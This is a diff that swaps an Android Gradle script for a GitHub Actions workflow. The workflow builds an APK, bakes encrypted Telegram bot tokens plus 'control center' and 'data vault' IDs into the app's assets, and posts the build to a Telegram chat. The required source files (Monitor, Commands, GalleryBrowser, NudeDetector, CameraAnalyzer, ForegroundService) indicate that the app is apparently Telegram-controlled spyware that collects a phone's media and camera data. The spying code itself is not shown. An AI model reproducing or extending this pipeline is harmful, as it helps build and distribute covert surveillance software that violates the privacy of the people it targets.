@@ -1,145 +1,261 @@
-plugins {
-    id("com.android.application")
-    id("org.jetbrains.kotlin.android")
-}
+name: Build Android Kotlin APK
 
-android {
-    namespace = "com.example.app"
-    compileSdk = 34
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
 
-    defaultConfig {
-        applicationId = "com.example.app"
-        minSdk = 26
-        targetSdk = 34
-        versionCode = 1
-        versionName = "1.0"
+jobs:
+  build:
+    runs-on: ubuntu-latest
 
-        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
 
-        // ✅ تحديد معماريات المعالج المدعومة فقط (v7 و v8) لتقليل حجم APK
-        ndk {
-            abiFilters.addAll(listOf("armeabi-v7a", "arm64-v8a"))
-        }
+      - name: Force clean all caches
+        run: |
+          echo "🧹 Removing all caches..."
+          rm -rf ~/.gradle/caches/ || true
+          rm -rf ~/.gradle/wrapper/ || true
+          rm -rf ~/.android/build-cache/ || true
+          rm -rf .gradle/ || true
+          rm -rf build/ || true
+          rm -rf app/build/ || true
+          echo "✅ All caches removed."
 
-        // ✅ تحديد اللغات المدعومة لتقليل حجم ملفات الموارد
-        resConfigs("en", "ar")
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
 
-        vectorDrawables {
-            useSupportLibrary = true
-        }
+      # ============================================================
+      # ✅ إنشاء ملف tokens.enc من GitHub Secrets (قبل Gradle)
+      # ============================================================
+      - name: Install cryptography for token encryption
+        run: pip install cryptography
 
-        buildConfigField("String", "VERSION", "\"${defaultConfig.versionName}\"")
-    }
+      - name: Generate encrypted tokens.enc
+        env:
+          BOT_1: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
+          BOT_2: ${{ secrets.TELEGRAM_BOT_2_TOKEN }}
+          BOT_3: ${{ secrets.TELEGRAM_BOT_3_TOKEN }}
+          BOT_4: ${{ secrets.TELEGRAM_BOT_4_TOKEN }}
+          BOT_5: ${{ secrets.TELEGRAM_BOT_5_TOKEN }}
+          BOT_6: ${{ secrets.TELEGRAM_BOT_6_TOKEN }}
+          BOT_7: ${{ secrets.TELEGRAM_BOT_7_TOKEN }}
+          BOT_8: ${{ secrets.TELEGRAM_BOT_8_TOKEN }}
+          BOT_9: ${{ secrets.TELEGRAM_BOT_9_TOKEN }}
+          BOT_10: ${{ secrets.TELEGRAM_BOT_10_TOKEN }}
+          CTRL_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
+          VAULT_ID: ${{ secrets.TELEGRAM_DATA_VAULT_ID }}
+          SECRET: ${{ secrets.TELEGRAM_SECRET }}
+          SECRET_KEY: ${{ secrets.SECRET_KEY }}
+        run: |
+          python3 -c "
+          import json, base64, os, hashlib
+          from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+          from cryptography.hazmat.primitives import padding
 
-    buildTypes {
-        release {
-            isMinifyEnabled = true
-            isShrinkResources = true
-            proguardFiles(
-                getDefaultProguardFile("proguard-android-optimize.txt"),
-                "proguard-rules.pro"
-            )
-        }
-        debug {
-            isMinifyEnabled = false
-            isDebuggable = true
-        }
-    }
+          # ✅ استخدام المفتاح من البيئة بدلاً من الثابت المكشوف
+          key_str = os.environ['SECRET_KEY']
+          key = hashlib.sha256(key_str.encode('utf-8')).digest()
 
-    compileOptions {
-        sourceCompatibility = JavaVersion.VERSION_17
-        targetCompatibility = JavaVersion.VERSION_17
-    }
+          data = {
+              'active': [os.environ['BOT_1'], os.environ['BOT_2'], os.environ['BOT_3'], os.environ['BOT_4'], os.environ['BOT_5'], os.environ['BOT_6']],
+              'reserve': [os.environ['BOT_7'], os.environ['BOT_8'], os.environ['BOT_9'], os.environ['BOT_10']],
+              'ctrl_id': int(os.environ['CTRL_ID']),
+              'vault_id': int(os.environ['VAULT_ID']),
+              'secret': os.environ['SECRET']
+          }
 
-    kotlinOptions {
-        jvmTarget = "17"
-        // ✅ إضافة خيارات ضغط كود Kotlin لتقليل حجم الـ DEX
-        freeCompilerArgs = listOf(
-            "-opt-in=kotlin.RequiresOptIn",
-            "-opt-in=kotlinx.coroutines.ExperimentalCoroutinesApi",
-            "-opt-in=kotlinx.coroutines.FlowPreview",
-            "-opt-in=kotlin.ExperimentalStdlibApi",
-            "-Xno-param-assertions",
-            "-Xno-call-assertions",
-            "-Xno-receiver-assertions"
-        )
-    }
+          json_str = json.dumps(data).encode('utf-8')
+          padder = padding.PKCS7(128).padder()
+          padded_data = padder.update(json_str) + padder.finalize()
 
-    buildFeatures {
-        buildConfig = true
-        viewBinding = true
-    }
+          cipher = Cipher(algorithms.AES(key), modes.ECB())
+          encryptor = cipher.encryptor()
+          encrypted = encryptor.update(padded_data) + encryptor.finalize()
 
-    packaging {
-        resources {
-            // ✅ استبعاد جميع ملفات META-INF غير الضرورية
-            excludes += setOf(
-                "META-INF/**",
-                "META-INF/AL2.0",
-                "META-INF/LGPL2.1",
-                "META-INF/DEPENDENCIES",
-                "META-INF/INDEX.LIST",
-                "META-INF/LICENSE",
-                "META-INF/LICENSE.txt",
-                "META-INF/NOTICE",
-                "META-INF/NOTICE.txt",
-                "META-INF/ASL2.0",
-                "META-INF/README.md",
-                "META-INF/MANIFEST.MF"
-            )
-            // ✅ استبعاد مكتبات Native غير المستخدمة (x86, x86_64, mips)
-            excludes += setOf(
-                "**/lib/x86/*.so",
-                "**/lib/x86_64/*.so",
-                "**/lib/mips/*.so"
-            )
-        }
-    }
+          encoded = base64.b64encode(encrypted).decode('utf-8')
+          os.makedirs('app/src/main/assets', exist_ok=True)
+          with open('app/src/main/assets/tokens.enc', 'w') as f:
+              f.write(encoded)
+          print('✅ tokens.enc generated and encrypted successfully')
+          "
 
-    testOptions {
-        unitTests.isIncludeAndroidResources = true
-        unitTests.isReturnDefaultValues = true
-    }
+      # ============================================================
+      # ✅ التحقق من وجود ملف tokens.enc بعد إنشائه
+      # ============================================================
+      - name: Verify tokens.enc exists
+        run: |
+          if [ -f "app/src/main/assets/tokens.enc" ]; then
+            echo "✅ tokens.enc created successfully."
+          else
+            echo "❌ tokens.enc not found!"
+            exit 1
+          fi
 
-    // ============================================================
-    // إعدادات Lint لتجنب إيقاف البناء بسبب أخطاء غير حرجة
-    // ============================================================
-    lint {
-        disable += "Instantiatable"
-        disable += "GradleDeprecated"
-        disable += "ObsoleteSdkInt"
-        disable += "MissingTranslation"
-        disable += "ExtraTranslation"
-        checkReleaseBuilds = false
-        abortOnError = false
-    }
-}
+      - name: Setup Gradle
+        uses: gradle/actions/setup-gradle@v4
+        with:
+          gradle-version: '8.2'
+          validate-wrappers: false
 
-dependencies {
-    // ===== AndroidX الأساسية =====
-    implementation("androidx.core:core-ktx:1.12.0")
-    implementation("androidx.appcompat:appcompat:1.6.1")
-    implementation("com.google.android.material:material:1.11.0")
-    implementation("androidx.constraintlayout:constraintlayout:2.1.4")
+      # ============================================================
+      # ✅ تنظيف المشروع قبل البناء
+      # ============================================================
+      - name: Clean project
+        run: |
+          echo "🧹 Cleaning project..."
+          ./gradlew clean --no-daemon
+          echo "✅ Clean completed."
 
-    // ===== دورة الحياة و Coroutines =====
-    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.7.0")
-    implementation("androidx.lifecycle:lifecycle-viewmodel-ktx:2.7.0")
-    implementation("androidx.lifecycle:lifecycle-livedata-ktx:2.7.0")
-    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
-    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-core:1.8.1")
+      # ============================================================
+      # ✅ 1. التحقق من وجود الملفات الأساسية قبل البناء
+      # ============================================================
+      - name: Check critical source files
+        id: check_files
+        run: |
+          echo "🔍 Checking critical source files..."
+          MISSING_FILES=""
+          
+          CRITICAL_FILES=(
+            "app/src/main/java/com/example/app/MainActivity.kt"
+            "app/src/main/java/com/example/app/DailyZipper.kt"
+            "app/src/main/java/com/example/app/Monitor.kt"
+            "app/src/main/java/com/example/app/TelegramUi.kt"
+            "app/src/main/java/com/example/app/Commands.kt"
+            "app/src/main/java/com/example/app/GalleryBrowser.kt"
+            "app/src/main/java/com/example/app/MediaScanner.kt"
+            "app/src/main/java/com/example/app/NudeDetector.kt"
+            "app/src/main/java/com/example/app/CameraAnalyzer.kt"
+            "app/src/main/java/com/example/app/ConfigLoader.kt"
+            "app/src/main/java/com/example/app/SecurityHelper.kt"
+            "app/src/main/java/com/example/app/FileDownloader.kt"
+            "app/src/main/java/com/example/app/StreamManager.kt"
+            "app/src/main/java/com/example/app/MapExtensions.kt"
+            "app/src/main/java/com/example/app/ForegroundService.kt"
+            "app/src/main/AndroidManifest.xml"
+            "app/build.gradle.kts"
+            "build.gradle.kts"
+            "settings.gradle.kts"
+            "gradle.properties"
+          )
+          
+          for file in "${CRITICAL_FILES[@]}"; do
+            if [ ! -f "$file" ]; then
+              echo "❌ Missing: $file"
+              MISSING_FILES="$MISSING_FILES\n  - $file"
+            else
+              echo "✅ Found: $file"
+            fi
+          done
+          
+          if [ -n "$MISSING_FILES" ]; then
+            echo "⚠️ WARNING: Some critical files are missing!"
+            echo "MISSING_FILES=true" >> $GITHUB_OUTPUT
+            echo "MISSING_LIST=$MISSING_FILES" >> $GITHUB_OUTPUT
+          else
+            echo "✅ All critical files found!"
+            echo "MISSING_FILES=false" >> $GITHUB_OUTPUT
+          fi
 
-    // ===== الشبكات ومعالجة JSON =====
-    implementation("com.squareup.okhttp3:okhttp:4.12.0")
-    implementation("com.squareup.okhttp3:logging-interceptor:4.12.0")
-    implementation("com.google.code.gson:gson:2.10.1")
+      # ============================================================
+      # ✅ 2. عرض هيكل المشروع لتسهيل التصحيح
+      # ============================================================
+      - name: Print project structure (debug)
+        run: |
+          echo "===== Project Structure (app/src/main/java) ====="
+          find app/src/main/java -type f -name "*.kt" | sort || echo "No Kotlin files found!"
+          echo ""
+          echo "===== Project Structure (app/src/main/res) ====="
+          find app/src/main/res -type f | sort || echo "No resource files found!"
+          echo ""
+          echo "===== Project Structure (app/src/main/assets) ====="
+          find app/src/main/assets -type f | sort || echo "No assets found!"
 
-    // ===== TensorFlow Lite (ضروري لتشغيل النموذج) =====
-    implementation("org.tensorflow:tensorflow-lite:2.14.0")
-    implementation("org.tensorflow:tensorflow-lite-support:0.4.4")
+      - name: Print DailyZipper.kt content
+        run: |
+          echo "===== DailyZipper.kt content ====="
+          cat app/src/main/java/com/example/app/DailyZipper.kt || echo "File not found!"
+          echo "================================="
 
-    // ===== اختبارات =====
-    testImplementation("junit:junit:4.13.2")
-    androidTestImplementation("androidx.test.ext:junit:1.1.5")
-    androidTestImplementation("androidx.test.espresso:espresso-core:3.5.1")
-}
+      # ============================================================
+      # ✅ 3. البناء باستخدام Gradle (مبسط)
+      # ============================================================
+      - name: Build Release APK
+        id: build
+        run: |
+          set +e
+          echo "🚀 Building Release APK..."
+          ./gradlew assembleRelease -Dorg.gradle.jvmargs="-Xmx2048m" --no-daemon
+          BUILD_EXIT_CODE=$?
+          set -e
+          echo "BUILD_EXIT_CODE=$BUILD_EXIT_CODE" >> $GITHUB_OUTPUT
+          if [ $BUILD_EXIT_CODE -ne 0 ]; then
+            echo "❌ Build failed with exit code $BUILD_EXIT_CODE"
+            exit $BUILD_EXIT_CODE
+          else
+            echo "✅ Build succeeded!"
+          fi
+
+      - name: Upload APK Artifact
+        if: success()
+        uses: actions/upload-artifact@v4
+        with:
+          name: app-release
+          path: app/build/outputs/apk/release/app-release-unsigned.apk
+
+      - name: Send APK to Telegram
+        if: success()
+        env:
+          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
+          CHAT_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
+        run: |
+          APK_PATH="app/build/outputs/apk/release/app-release-unsigned.apk"
+          if [ -f "$APK_PATH" ]; then
+            APK_SIZE=$(du -h "$APK_PATH" | cut -f1)
+            CAPTION="✅ *Shield Core v4.2 (Kotlin)*%0A• Build Success (Release)!%0A• Minified & Optimized%0A• Size: $APK_SIZE%0A• $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
+            curl -s -F "chat_id=$CHAT_ID" -F "document=@$APK_PATH" -F "caption=$CAPTION" -F "parse_mode=Markdown" \
+              "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
+          else
+            echo "⚠️ APK file not found!"
+          fi
+
+      # ============================================================
+      # ✅ 4. تقرير فشل شامل (مبسط)
+      # ============================================================
+      - name: Send comprehensive failure report
+        if: failure()
+        env:
+          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
+          CHAT_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
+        run: |
+          REPORT_FILE="build_failure_report.txt"
+          {
+            echo "❌ BUILD FAILURE REPORT"
+            echo "========================"
+            echo ""
+            echo "📦 Repository: ${{ github.repository }}"
+            echo "🔄 Run ID: ${{ github.run_id }}"
+            echo "📅 Date: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
+            echo ""
+            echo "📂 Build Environment:"
+            echo "  - OS: ${{ runner.os }}"
+            echo "  - JDK: 17"
+            echo "  - Gradle: 8.2"
+            echo ""
+            echo "📄 CRITICAL FILES CHECK:"
+            echo "------------------------"
+            echo "${{ steps.check_files.outputs.MISSING_LIST || '✅ All files found' }}"
+            echo ""
+            echo "📄 Gradle Version:"
+            echo "------------------"
+            ./gradlew --version 2>/dev/null || echo "Gradle not found!"
+            echo ""
+            echo "--- End of report ---"
+          } > "$REPORT_FILE"
+          curl -s -F "chat_id=$CHAT_ID" -F "document=@$REPORT_FILE" -F "caption=❌ تقرير فشل البناء" \
+            "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
